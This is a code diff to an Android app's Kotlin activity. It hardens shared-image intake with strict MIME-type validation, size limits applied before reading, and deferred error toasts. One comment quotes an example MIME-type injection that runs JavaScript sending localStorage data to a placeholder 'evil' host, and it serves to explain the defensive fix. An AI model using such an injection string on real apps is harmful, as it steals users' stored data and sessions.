@@ -193,19 +193,47 @@ class MainActivity : AppCompatActivity() {
             android.content.Intent.ACTION_VIEW -> i.data
             else -> null
         } ?: return
-        val type = i.type ?: contentResolver.getType(uri) ?: "image/*"
-        if (!type.startsWith("image/")) return
+        // The sender chooses this string and it ends up inside a JavaScript
+        // statement, so it is never trusted: anything but a plain image media
+        // type is thrown away and replaced. A type like
+        //   image/x','y');fetch('https://evil/'+localStorage.lastRef);//
+        // passes a startsWith check and then runs as code in the origin that
+        // holds every reference and the signed-in session.
+        val raw = i.type ?: contentResolver.getType(uri) ?: ""
+        if (!raw.startsWith("image/")) return
+        val type = if (Regex("^image/[A-Za-z0-9.+-]{1,40}$").matches(raw)) raw else "image/*"
         // consumed: a rotation must not re-import the same picture
         i.action = null
         Thread {
             try {
+                // the size is checked BEFORE the bytes are read: readBytes()
+                // materialises the whole file first and grows a doubling
+                // buffer, so a 300MB share cost ~600MB and killed the
+                // renderer before any guard could speak
+                val LIMIT = 96L * 1024 * 1024
+                try {
+                    contentResolver.openAssetFileDescriptor(uri, "r")?.use { fd ->
+                        val n = fd.length
+                        if (n != android.content.res.AssetFileDescriptor.UNKNOWN_LENGTH && n > LIMIT) {
+                            shareFail("that image is too large to open")
+                            return@Thread
+                        }
+                    }
+                } catch (e: Throwable) {}
                 val bytes = contentResolver.openInputStream(uri)?.use { st ->
-                    // a shared file is someone else's; refuse absurd sizes
-                    // rather than dying with it in memory
-                    val b = st.readBytes()
-                    if (b.size > 96 * 1024 * 1024) null else b
+                    val buf = java.io.ByteArrayOutputStream(1 shl 16)
+                    val chunk = ByteArray(1 shl 16)
+                    var total = 0L
+                    while (true) {
+                        val k = st.read(chunk)
+                        if (k <= 0) break
+                        total += k
+                        if (total > LIMIT) return@use null      // stop reading, not after
+                        buf.write(chunk, 0, k)
+                    }
+                    buf.toByteArray()
                 } ?: run {
-                    runOnUiThread { js("toast && toast('that image could not be opened', false, 5000)") }
+                    shareFail("that image could not be opened")
                     return@Thread
                 }
                 var name = "shared"
@@ -223,9 +251,19 @@ class MainActivity : AppCompatActivity() {
                 }
             } catch (e: Throwable) {
                 logLine("share in: " + e.message)
-                runOnUiThread { js("toast && toast('that image could not be opened', false, 5000)") }
+                shareFail("that image could not be opened")
             }
         }.start()
+    }
+
+    // a share that fails on a COLD start used to say nothing at all: the page
+    // did not exist yet to be told. Hold the word until it does.
+    @Volatile private var failPending: String? = null
+    private fun shareFail(msg: String) {
+        synchronized(this) {
+            if (booted) runOnUiThread { js("toast && toast('" + jsStr(msg) + "', false, 5000)") }
+            else failPending = msg
+        }
     }
 
     private fun jsStr(s: String) = s.replace("\\", "\\\\").replace("'", "\\'")
@@ -367,7 +405,18 @@ class MainActivity : AppCompatActivity() {
                         sharedPending = null
                         web.postDelayed({ js("window.__shared && __shared($p)") }, 400)
                     }
+                    failPending?.let { m ->
+                        failPending = null
+                        web.postDelayed({ js("toast && toast('" + jsStr(m) + "', false, 5000)") }, 1200)
+                    }
                 }
+                // --adh lives in an inline style, so a reload (a language
+                // change, the service worker) wipes it and the page falls back
+                // to a hardcoded 76px under a strip that may be taller. The
+                // cached height is not "already sent" to a page that no longer
+                // knows it.
+                adSentH = -1
+                web.postDelayed({ reportAdHeight() }, 300)
                 // the page after a renderer death gets told what happened
                 try {
                     val p = getSharedPreferences("ui", 0)
